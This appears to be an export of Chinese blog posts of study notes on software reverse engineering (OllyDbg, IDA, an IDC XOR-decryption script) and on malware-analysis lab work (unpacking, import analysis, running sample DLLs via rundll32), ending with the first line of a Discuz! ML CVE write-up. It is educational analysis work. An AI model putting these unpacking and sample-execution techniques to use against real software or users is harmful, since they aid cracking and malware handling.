<h5 id="0x02-win-api函数"><a href="#0x02-win-api函数" class="headerlink" title="0x02 win api函数"></a>0x02 win api函数</h5><p>应用程序编程接口，相当于是一个合成了各个功能的函数库，提供应用程序运行所需要的窗口管理、内存管理等功能</p>
<p>windows应用程序-&gt;API-&gt;系统服务-&gt;硬件层</p>
<p>常用函数：</p>
<ul>
<li><p>hmemcpy{目的数据地址，源数据地址，数据大小}：拷贝数据，当做断点</p>
</li>
<li><p>GetWindowsText{句柄，缓冲区地址，复制的最大字符数}：获得文本控件内容</p>
</li>
<li><p>GetDlgItem{句柄，控件标识}：获取指定对话框的句柄</p>
</li>
<li><p>GetDlgItemText{句柄，控件标识，缓冲区指针，缓冲区长度}：获取对话框文本，成功就返回文本长度</p>
</li>
<li><p>messageBox{父窗口句柄，消息框文本，消息框标题，消息框样式}：创建信息框</p>
</li>
</ul>
<h5 id="0x03-句柄"><a href="#0x03-句柄" class="headerlink" title="0x03 句柄"></a>0x03 句柄</h5><p>相当于一个唯一的标识，通常为32位，让windows能正确引用对应的对象。当一个进程被初始化的，系统会分配句柄表，句柄值就是索引</p>
<h5 id="0x04-windows消息机制"><a href="#0x04-windows消息机制" class="headerlink" title="0x04 windows消息机制"></a>0x04 windows消息机制</h5><p>消息是给应用程序与应用程序之间、应用程序与windows系统间通信的</p>
<p>应用程序实现功能靠消息触发，靠消息响应和处理来完成</p>
<p>流程：事件发生-&gt;windows把输入的消息放入系统消息队列-&gt;拷贝到相应的应用程序队列-&gt;循环检索发给对应的应用程序窗口</p>
<p>常用函数：</p>
<ul>
<li>sendMessage{目的窗口句柄，消息标识，消息的WPARAM，消息的LPARAM}</li>
</ul>
<h5 id="0x05-保护模式"><a href="#0x05-保护模式" class="headerlink" title="0x05 保护模式"></a>0x05 保护模式</h5><p>虚拟内存：简化内存管理，防止多程序间的冲突</p>
<p>应用程序不会直接访问物理内存，应用程序启动时，操作系统会新建一个进程，分配给它2GB的虚拟地址，虚拟内存管理器将应用程序的代码映射到虚拟地址中，并把当前所需要的代码读取到物理地址中。</p>
<p>dll也会映射到虚拟地址，但是都是要和对应的使用的应用程序一起，没有自己私有的虚拟地址。</p>
<p>不同应用程序的虚拟地址是隔离的。</p>
<h4 id="0x2-动态调试"><a href="#0x2-动态调试" class="headerlink" title="0x2 动态调试"></a>0x2 动态调试</h4><h6 id="0x01-OD的使用"><a href="#0x01-OD的使用" class="headerlink" title="0x01 OD的使用:"></a>0x01 OD的使用:</h6><p>L：log</p>
<p>E：executable</p>
<p>M：memory</p>
<p>T：threads</p>
<p>W：windows</p>
<p>Hhandles</p>
<p>C：CPU，默认的主窗口，绝大部分操作，包括了反汇编，信息，数据，寄存器和堆栈</p>
<p>P：patches</p>
<p>K：call stack</p>
<p>B：breakpoints</p>
<p>R：reference</p>
<p>S：source</p>
<p>反汇编窗口：</p>
<p>地址：单击地址可以跳转，再次双击可以返回</p>
<p>机器码：设置或取消无条件断点，F2</p>
<p>汇编代码：可以直接修改</p>
<p>注释：分号(;)可以加注释</p>
<p>信息窗口：</p>
<p>显示寄存器值、API函数、跳转提示等</p>
<p>数据面板：</p>
<p>十六进制显示，ctrl+G可以快速跳转到对应地址</p>
<p>寄存器面板：</p>
<p>单击鼠标右键可以切换显示寄存器的方式</p>
<p>堆栈面板：</p>
<p>显示ESP指向地址的内容，API函数和子程序等</p>
<h4 id="0x3-静态分析"><a href="#0x3-静态分析" class="headerlink" title="0x3 静态分析"></a>0x3 静态分析</h4><p>peid用来查壳，ida用来静态分析，做逆向题的时候经常用到</p>
<h6 id="0x01-ida的常用功能"><a href="#0x01-ida的常用功能" class="headerlink" title="0x01 ida的常用功能"></a>0x01 ida的常用功能</h6><p>F5 反汇编</p>
<h6 id="0x02-IDC脚本的使用实践"><a href="#0x02-IDC脚本的使用实践" class="headerlink" title="0x02 IDC脚本的使用实践"></a>0x02 IDC脚本的使用实践</h6><p>比如用来解密对代码段进行加密的程序</p>
<p><strong>smc</strong>（self modifying code）技术，在可执行文件中保存着加密后的数据。只有在程序运行的时候，程序某处的代码就会被调用来解密</p>
<p>书本例子实践：</p>
<p>打开书本里的例子exe</p>
<p>是一个pe32的文件，用ida7.0（32）版本的ida</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712165355470.png" alt="image-20210712165355470"></p>
<p>打开后看到程序入口：</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712164939040.png" alt="image-20210712164939040"></p>
<p>看到了call 401080和401060的操作，点击过去看看</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712165750238.png" alt="image-20210712165750238"></p>
<p>反汇编一下：</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712165645333.png" alt="image-20210712165645333"></p>
<p>看起来像是对401060做了一系列操作</p>
<p>401060的函数如下，无法看出功能</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712165134938.png" alt="image-20210712165134938"></p>
<p>理解401080，是从401060的首位开始，之后的每一位数据和1做异或，运行到401074为止</p>
<p>编写一个idc脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line">static decrypt(from, size, key ) &#123; &#x2F;&#x2F;from是解密的开始地址，size是大小，key是异或的值</span><br><span class="line">   auto i, x; </span><br><span class="line">   for ( i&#x3D;0; i &lt; size; i&#x3D;i+1 ) &#123; </span><br><span class="line">      x &#x3D; Byte(from); &#x2F;&#x2F;获取一个字节数据</span><br><span class="line">      x &#x3D; (x^key); &#x2F;&#x2F;进行异或</span><br><span class="line">      PatchByte(from,x); &#x2F;&#x2F;将一个字节数据放回原处</span><br><span class="line">      from &#x3D; from + 1;&#x2F;&#x2F;地址加1</span><br><span class="line">   &#125; </span><br><span class="line"> Message(&quot;\n&quot; + &quot;Decrypt Complete\n&quot;);</span><br><span class="line">&#125; </span><br><span class="line">static main()&#123;</span><br><span class="line">	decrypt(0x401060, 0x15, 0x1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712182457179.png" alt="image-20210712182457179"></p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712182432116.png" alt="image-20210712182432116"></p>
<p>运行结束：401060函数的数据就被解密出来了</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712182522600.png" alt="image-20210712182522600"></p>
<p>还是无法看出来是什么功能</p>
<p>按u，全部转换成数据：</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712182813147.png" alt="image-20210712182813147"></p>
<p>再按c，ida重新分析，即可得到最终代码</p>
<p><img src="/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/image-20210712182831000.png" alt="image-20210712182831000"></p>
<p>附:IDC常用函数：</p>
<p><strong>读取和修改数据的函数：</strong></p>
<ul>
<li>long Byte（long addr），从虚拟地址addr处读取一个字节值</li>
<li>long Word（long addr），从虚拟地址addr处读取一个字（2个字节）值</li>
<li>long Dword（long addr），从虚拟地址addr处读取一个双字（4个字节）值</li>
<li>long PatchByte（long addr，long val），设置虚拟地址addr处的一个字节值</li>
<li>long PatchWord（long addr，long val），设置虚拟地址addr处的一个字值</li>
<li>long PatchDword（long addr，long val），设置虚拟地址addr处读取一个双字值</li>
<li>void idLoaded（long addr），如果addr包含有效数据，则返回1，否则返回0</li>
</ul>
<p><strong>用户交互函数：</strong></p>
<ul>
<li>void Message（string fromat，……），在输出窗口打印一条格式化消息，这个函数类似于C语言的printf函数，并接受printf风格的格式化字符串</li>
<li>void printf（……），在输出窗口中打印每个参数的字符串表示形式</li>
<li>void Warning（string fromat，……），在对话框中显示一条格式化消息</li>
<li>string AskStr（string default，string prompt），显示一个输入框，要求用户输入一个字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0</li>
<li>string AskFile（long doSave，string mask，String prompt），显示一个文件选择对话框，以简化选择文件的任务。你可以创建新文件保存数据（doSave=1），或选择现有的文件读取数据（doSave=0）。你可以根据mask（如*.<em>或</em>.idc）过滤显示的文件列表。如果操作成功，则返回选定文件的名称；如果对话框被取消，则返回0</li>
<li>long AskYN（long deafult，string prompt），用一个答案为“是”或“否”的问题提示用户，如初一个默认的答案（1为是，0为否，-1为取消）。返回值是一个表示选定答案的整数。</li>
<li>long ScreenEA（），返回当前光标所在位置的虚拟地址</li>
<li>bool Jump（long addr），跳转到反汇编窗口的指定地址</li>
</ul>
<h6 id="0x03-hiew使用"><a href="#0x03-hiew使用" class="headerlink" title="0x03 hiew使用"></a>0x03 hiew使用</h6><p>F5 输入地址后跳转</p>
<p>F3 修改文件内容，直接输入要修改的数字即可</p>
<p>F9 更新，修改完内容后可以更新一下</p>
<p>F10 更新完后文件内容就被修改了</p>
<h4 id="0x4-逆向分析技术"><a href="#0x4-逆向分析技术" class="headerlink" title="0x4 逆向分析技术"></a>0x4 逆向分析技术</h4><h6 id="启动函数："><a href="#启动函数：" class="headerlink" title="启动函数："></a><strong>启动函数：</strong></h6><p>编译器会生成的一个代码，用来完成初始化进程，然后才会执行winmain函数。各编译器有各自的启动函数。启动函数在分析的时候可以略过</p>
<h6 id="函数："><a href="#函数：" class="headerlink" title="函数："></a><strong>函数：</strong></h6><ul>
<li><p>组成：函数名，入口参数，返回值，函数功能</p>
<p>CALL指令：会保存返回信息（它之后的指令的地址），遇到RET的时候就返回。CALL后跟着的就是被调用的函数的首地址</p>
</li>
<li><p>参数传递：</p>
<ul>
<li><p>堆栈方式：先进后出。</p>
<p>流程：1、压入函数结束时应返回的地址和需要的一些参数</p>
<p>​            2、函数使用EBP指针+偏移量对堆栈中的参数进行寻址，然后取出进行操作</p>
<p>​            3、函数使用RET返回，CPU把EIP设为之前堆栈里存入的应返回的地址，继续执行</p>
<p>一般用EBP存取堆栈，也会用ESP堆栈指针来寻址，结合栈溢出学习看</p>
</li>
<li><p>寄存器方式：一部分参数使用寄存器，用完的话剩下的用堆栈</p>
</li>
<li><p>通过全局变量进行隐含参数的传递</p>
</li>
</ul>
</li>
<li><p>返回值：</p>
<p>一般放在EAX中返回，如果结果超过了EAX的容量，其高32位就会放到EDX中</p>
</li>
</ul>
<h6 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h6><ul>
<li><p>局部变量：</p>
<p>在堆栈中进行分配，函数执行完就释放。或者直接存在寄存器中。</p>
</li>
<li><p>全局变量：</p>
<p>作用于整个程序，放在全局变量的内存区，通常位于一个固定的位置</p>
</li>
<li><p>数组：</p>
<p>在内存中按顺序连续存放在一起，一般用基址+偏移量来访问</p>
</li>
</ul>
<h6 id="控制语句："><a href="#控制语句：" class="headerlink" title="控制语句："></a>控制语句：</h6><p>CMP：</p>
<p>JZ：</p>
<h6 id="指令修改："><a href="#指令修改：" class="headerlink" title="指令修改："></a>指令修改：</h6><p>替换一个字节：90 nop</p>
<h4 id="0x5-常见的保护技术"><a href="#0x5-常见的保护技术" class="headerlink" title="0x5 常见的保护技术"></a>0x5 常见的保护技术</h4><h4 id="0x4-解密"><a href="#0x4-解密" class="headerlink" title="0x4 解密"></a>0x4 解密</h4><h4 id="0x5-PE文件"><a href="#0x5-PE文件" class="headerlink" title="0x5 PE文件"></a>0x5 PE文件</h4><h4 id="0x6-脱壳"><a href="#0x6-脱壳" class="headerlink" title="0x6 脱壳"></a>0x6 脱壳</h4><h4 id="0x7-保护"><a href="#0x7-保护" class="headerlink" title="0x7 保护"></a>0x7 保护</h4><h4 id="0x8-PEDIY"><a href="#0x8-PEDIY" class="headerlink" title="0x8 PEDIY"></a>0x8 PEDIY</h4>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意代码分析实战笔记--更新中</title>
    <url>/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="恶意代码分析实战笔记–更新中"><a href="#恶意代码分析实战笔记–更新中" class="headerlink" title="恶意代码分析实战笔记–更新中"></a>恶意代码分析实战笔记–更新中</h3><p>所有分析文件下载：<a href="https://github.com/mikesiko/PracticalMalwareAnalysis-Labs">https://github.com/mikesiko/PracticalMalwareAnalysis-Labs</a></p>
<a id="more"></a>

<h4 id="0x1-恶意代码类型"><a href="#0x1-恶意代码类型" class="headerlink" title="0x1 恶意代码类型"></a>0x1 恶意代码类型</h4><p>后门，僵尸网络，下载器，间谍软件，启动器，内核套件，勒索软件，发送垃圾邮件，蠕虫或病毒</p>
<h4 id="0x2-分析方法"><a href="#0x2-分析方法" class="headerlink" title="0x2 分析方法"></a>0x2 分析方法</h4><h5 id="0x21-静态分析"><a href="#0x21-静态分析" class="headerlink" title="0x21 静态分析"></a>0x21 静态分析</h5><h6 id="反病毒引擎扫描："><a href="#反病毒引擎扫描：" class="headerlink" title="反病毒引擎扫描："></a>反病毒引擎扫描：</h6><p><strong>virustotal</strong>:<a href="http://www.virustotal.com/">http://www.virustotal.com</a></p>
<h6 id="哈希："><a href="#哈希：" class="headerlink" title="哈希："></a>哈希：</h6><p>恶意代码的指纹，常用md5算法和sha1，可以通过搜索哈希值去看是否已经被识别分析过</p>
<p>可以用<strong>md5deep</strong>来生成一个程序的哈希值/或者<strong>winmd5</strong></p>
<h6 id="Strings"><a href="#Strings" class="headerlink" title="Strings:"></a>Strings:</h6><p>可以用<strong>strings</strong>来简单查看程序中含有的字符串，但是并非完全可靠，主要是要从错误信息中获取有效信息，如错误信息中提示了说缺少邮件类型的dll,我们就可以猜测到这个程序可能是利用了邮件系统</p>
<h6 id="混淆与加壳"><a href="#混淆与加壳" class="headerlink" title="混淆与加壳"></a>混淆与加壳</h6><p>加壳是混淆的一种</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123095412066.png" alt="image-20201123095412066"></p>
<p>可以用<strong>peid</strong>之类的工具来检测和脱壳</p>
<h6 id="pe文件头："><a href="#pe文件头：" class="headerlink" title="pe文件头："></a>pe文件头：</h6><p>pe文件头里的信息</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123101809636.png" alt="image-20201123101809636"></p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123101503221.png" alt="image-20201123101503221"></p>
<p>resourcehacker可以查看资源节(.rsrc)</p>
<h6 id="链接库和函数："><a href="#链接库和函数：" class="headerlink" title="链接库和函数："></a>链接库和函数：</h6><p>ida中可以看到导入表</p>
<p><strong>dependence</strong> <strong>walker</strong>工具可以列出程序的动态链接函数</p>
<p>常见dll：</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123095848393.png" alt="image-20201123095848393"></p>
<p>导入函数可以去微软官方文档查</p>
<h5 id="第一章实践：【】内为官方答案补充"><a href="#第一章实践：【】内为官方答案补充" class="headerlink" title="第一章实践：【】内为官方答案补充"></a>第一章实践：【】内为官方答案补充</h5><h6 id="0x211："><a href="#0x211：" class="headerlink" title="0x211："></a>0x211：</h6><p>将文件上传到网站后，发现已经有很多引擎匹配到了，在details里可以看到详细情况</p>
<p>可以看到编译时间是2010-12-19【可以看一下exe和dll文件的日期，相差在一分钟之内】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123103846810.png" alt="image-20201123103846810"></p>
<p>用exeinfo看这两个文件，都没有加壳</p>
<p>可以用<strong>detectiteasy</strong>查看1.exe的输入表，看到创建文件和复制文件（createfilea/copyfilea）以及搜索一个目录下的所有函数（findnextfila/findfirstfile）的导入函数，我们可以猜测这个程序可能会创建一个文件然后复制到某个文件夹下。1.dll的输入表里可以看到创建进程和睡眠的导入函数【ws2_32.dll是提供了联网服务】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123112803267.png" alt="image-20201123112803267"></p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123113248321.png" alt="image-20201123113248321"></p>
<p>运行程序后程序闪退，开启<strong>wireshark</strong>抓包没有抓到，所以并没有通过网络，同文件夹下并无明显文件变化【.dll文件中隐藏了一个ip地址】</p>
<p>打开ida分析，应该是用lab01这个dll替换了kernel32.dll【应该可以在文件夹下看到kerne132.dll，但是有系统限制（win10没有】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123114322202.png" alt="image-20201123114322202"></p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123155740170.png" alt="image-20201123155740170"></p>
<p>【可以猜测.dll是后门文件，.exe是用来安装和运行.dll文件的】</p>
<h6 id="0x212："><a href="#0x212：" class="headerlink" title="0x212："></a>0x212：</h6><p>将文件上传到网站后，有很多引擎匹配到</p>
<p>可以看到有加了upx的壳</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123145915934.png" alt="image-20201123145915934"></p>
<p>找了upx脱壳软件，重新看原文件就没有壳了</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123150625482.png" alt="image-20201123150625482"></p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123150719541.png" alt="image-20201123150719541"></p>
<p>接下来看看导入函数，kernel32中有可以猜测使用CreateWaitableTimer函数创建可等待的计时器对象，然后使用SetWaitableTimer函数设置计时器以及WaitForSingleObject函数来确定何时向计时器发出信号。</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123151014222.png" alt="image-20201123151014222"></p>
<p>【winner中有可以猜测是打开网站的internetopenurl函数】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123160439581.png" alt="image-20201123160439581"></p>
<p>【advapi32中有可以猜测是创建服务的createservicea函数】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123160530351.png" alt="image-20201123160530351"></p>
<p>【使用strings可以猜测是创建了一个叫malservice的服务，会访问malwareanalysibook这个网站】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123161324560.png" alt="image-20201123161324560"></p>
<h6 id="0x213："><a href="#0x213：" class="headerlink" title="0x213："></a>0x213：</h6><p>将文件上传到网站后，有很多引擎匹配到</p>
<p>看看有没有加壳，通过scan/t按钮可以看到是fsg1.0壳，工具比较少，应该要手动脱壳</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123151306021.png" alt="image-20201123151306021"></p>
<h6 id="0x214"><a href="#0x214" class="headerlink" title="0x214:"></a>0x214:</h6><p>将文件上传到网站后，有很多引擎匹配到</p>
<p>没有加壳，可以看到有movefile,findresourcea等函数，还有writefile和createfilea，猜测是写文件和复制资源</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123152755628.png" alt="image-20201123152755628"></p>
<p>【advapi32.dll可以猜测程序会做一些和权限相关的工作，从字符串可以猜测从这个网站下载恶意程序，位置就是在system32下】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123161610357.png" alt="image-20201123161610357"></p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123161758555.png" alt="image-20201123161758555"></p>
<p>用resourcehacker看看资源，不是很理解【这是另一个pe可执行文件，可以保存下来然后再次分析这个文件（可以将可执行文件保存为资源）】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123153940389.png" alt="image-20201123153940389"></p>
<p>【将它save as bin文件，然后再放到die里打开，可以看到urldownloadtofile，可以猜测这是一个下载器】</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201123162708369.png" alt="image-20201123162708369"></p>
<h5 id="0x22-动态分析"><a href="#0x22-动态分析" class="headerlink" title="0x22 动态分析"></a>0x22 动态分析</h5><h6 id="沙箱："><a href="#沙箱：" class="headerlink" title="沙箱："></a>沙箱：</h6><p>在安全的环境中运行不可信任的机制，沙箱包含一个虚拟环境，通过某种方法模拟网络服务</p>
<p>恶意代码分析的沙箱：Norman和gfi</p>
<h6 id="dll运行："><a href="#dll运行：" class="headerlink" title="dll运行："></a>dll运行：</h6><p>恶意的dll文件通常在dllmain执行代码，无论dll什么时候被加载，dllmain函数总会被执行。</p>
<p><strong>cmd</strong>:rundll32.exe dllname,export arguments</p>
<p>export值必须是一个dll文件导出函数表中的函数名或者序号（前面加‘#’）</p>
<p>例如：runnel32.exe test.dll, install</p>
<p><strong>也可以通过修改</strong>PE头部，并改变扩展名</p>
<p>修改PE头部，从IMAGE_FILE_HEADER的特征域里擦除IMAGE_FILE_DLL(0x2000)标记。这样不会执行任何输入函数，但是会调用dllmain方法，也可能造成恶意代码崩溃或终止</p>
<p><strong>安装成服务</strong>：</p>
<p>例如：cmd&gt;rundll32 ipr32x.dll,installservice servicename</p>
<p>然后用net start命令就可以执行</p>
<h6 id="进程监视："><a href="#进程监视：" class="headerlink" title="进程监视："></a>进程监视：</h6><p>process monitor/process explorer:监控注册表、文件系统、网络、进程和线程行为</p>
<p>regshot：比较前后两次注册表快照</p>
<h6 id="模拟网络："><a href="#模拟网络：" class="headerlink" title="模拟网络："></a>模拟网络：</h6><p>ApateDns:查看恶意代码是否会发出dns请求，修改dns配置</p>
<p>netcat：监听</p>
<p>Inetsim：linux下模拟常见网络服务，记录所有的连入请求和链接</p>
<h6 id="数据包监听："><a href="#数据包监听：" class="headerlink" title="数据包监听："></a>数据包监听：</h6><p>Wireshark</p>
<h6 id="动态整体流程："><a href="#动态整体流程：" class="headerlink" title="动态整体流程："></a>动态整体流程：</h6><p>运行进程监视器和进程浏览器-&gt;regshot注册表快照-&gt;inetsim+apatedns设置虚拟网络-&gt;wireshark看抓包</p>
<p><img src="/2020/11/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201126162144572.png" alt="image-20201126162144572"></p>
<h5 id="0x23-静态分析进阶"><a href="#0x23-静态分析进阶" class="headerlink" title="0x23 静态分析进阶"></a>0x23 静态分析进阶</h5><p>计算机：硬件-&gt;微指令-&gt;机器码-&gt;低级语言（汇编）-&gt;高级语言-&gt;解释型语言</p>
<p>冯诺伊曼体系：cpu（寄存器，控制单元，算数逻辑单元（ALU）），内存，输入输出</p>
<h6 id="内存："><a href="#内存：" class="headerlink" title="内存："></a>内存：</h6><p>包含堆（动态内存），栈，代码，数据</p>
<h6 id="寄存器："><a href="#寄存器：" class="headerlink" title="寄存器："></a>寄存器：</h6><p><img src="/Users/kami/Desktop/hexo/source/_posts/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201201163409806.png" alt="image-20201201163409806"></p>
<p>用AH之类的可以取EAX中的值</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201201163513378.png" alt="image-20201201163513378"></p>
<p>乘法和除法只能用EAX和EDX</p>
<h6 id="标志寄存器："><a href="#标志寄存器：" class="headerlink" title="标志寄存器："></a>标志寄存器：</h6><p>ZF：运算结果等于0，ZF被置位</p>
<p>CF：运算结果相对于目标操作数太大或太小</p>
<p>SF：运算结果为负或者算术运算结果最高位值为1</p>
<p>TF：用于调试</p>
<h6 id="lea和mov："><a href="#lea和mov：" class="headerlink" title="lea和mov："></a>lea和mov：</h6><p>lea是获取地址的值，mov是获取存在该地址的数据的值</p>
<h6 id="栈："><a href="#栈：" class="headerlink" title="栈："></a>栈：</h6><p>存储函数的内存、局部变量、流控制结构等，短期存储，主要用途是管理函数调用之间的数据交换，后入先出</p>
<p>ESP是栈指针，相关指令：push, pop,call,leave,enter,ret</p>
<p>EBP是栈基址寄存器，程序的定位器，在一个函数中会保持不变，用来确定局部变量和参数的位置</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/image-20201201174659216.png" alt="image-20201201174659216"></p>
<h6 id="函数调用约定："><a href="#函数调用约定：" class="headerlink" title="函数调用约定："></a>函数调用约定：</h6><p>决定函数调用发生的方式，包含参数被放在栈上或寄存器中的次序，以及是由调用者还是被调函数负责在函数执行完成时清理栈</p>
<p>cdecl:参数从右到左压入栈，函数完成时由调用者清理栈，返回值保存在EAX</p>
<p>stdcall:同上，被调函数清理栈</p>
<p>fastcall:前一些参数（典型是前两个）会被传到寄存器中，备用寄存器是EDX和ECX</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0Dcve-2019-13956</title>
    <url>/2020/11/12/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/0x0Dcve-2019-13956/</url>
    <content><![CDATA[<h4 id="CVE-2019-13956Discuz-ML远程代码执行"><a href="#CVE-2019-13956Discuz-ML远程代码执行" class="headerlink" title="CVE-2019-13956Discuz! ML远程代码执行"></a>CVE-2019-13956Discuz! ML远程代码执行</h4><p>参考：<a href="https://www.cnblogs.com/yuzly/p/11386755.html">https://www.cnblogs.com/yuzly/p/11386755.html</a></p>
<a id="more"></a>

<h5 id="0x1-复现过程"><a href="#0x1-复现过程" class="headerlink" title="0x1 复现过程"></a>0x1 复现过程</h5><p>这个漏洞复现起来还是很容易的，软件也是免费开源的，搭起来就没什么问题</p>
